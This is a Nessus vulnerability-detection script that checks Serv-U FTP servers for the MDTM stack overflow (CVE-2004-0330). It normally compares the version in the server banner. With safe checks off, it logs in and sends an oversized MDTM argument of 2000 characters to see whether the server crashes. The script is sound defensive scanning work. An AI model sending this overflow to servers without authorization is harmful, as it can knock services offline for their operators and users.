#
# (C) Tenable Network Security
# 

if(description)
{
 script_id(12080);
 script_cve_id("CVE-2004-0330");
 script_bugtraq_id(9751);
 script_version ("$Revision: 1.9 $");
 
 name["english"] = "FTP Serv-U Server MDTM Stack Overflow Vulnerability";
 
 script_name(english:name["english"]);
	     
 desc["english"] = "
The remote host is running Serv-U FTP server.

There is a bug in the way this server handles arguments to the MDTM 
requests which may allow an attacker to trigger a buffer overflow against
this server, which may allow him to disable this server remotely or to
execute arbitrary code on this host.

Solution : Upgrade Serv-U Server, at least to version 4.3 or use another server
Risk factor : High";
		 
		 
 script_description(english:desc["english"]);

 
 script_summary(english:"Serv-U Stack Overflow");
 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
		  
 script_require_ports("Services/ftp", 21);
 script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");

 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

banner = get_ftp_banner(port:port);
if ( ! banner ) exit(0);

if("Serv-U FTP Server " >!< banner )exit(0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");
if (!login || safe_checks()) {

 data = "
The remote host is running Serv-U FTP server.

There is a bug in the way this server handles arguments to the MDTM 
requests which may allow an attacker to trigger a buffer overflow against
this server, which may allow him to disable this server remotely or to
execute arbitrary code on this host.

** Nessus only check the version number in the server banner
** To really check the vulnerability, disable safe_checks

Solution : Upgrade to Serv-U Server 4.3.0 or newer
Risk factor : High";

 banner = get_ftp_banner(port:port);
 if ( ! banner ) exit(0);

 if(egrep(pattern:"Serv-U FTP Server v(([0-3]\..*)|(4\.[0-2]\.))", string:banner))security_hole(port: port, data: data); 
 exit(0);
}


if(login)
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 if(ftp_authenticate(socket:soc, user:login,pass:password))
 {
 crp = crap(data:"a", length:2000);
 req = string("MDTM ", crp, "\r\n");
 send(socket:soc, data:req);
 r = recv_line(socket:soc, length:4096);
 if(!r)
 {
  security_hole(port);
  exit(0);
 }
 data = string("QUIT\r\n");
 send(socket:soc, data:data);
 }
 close(soc);
}
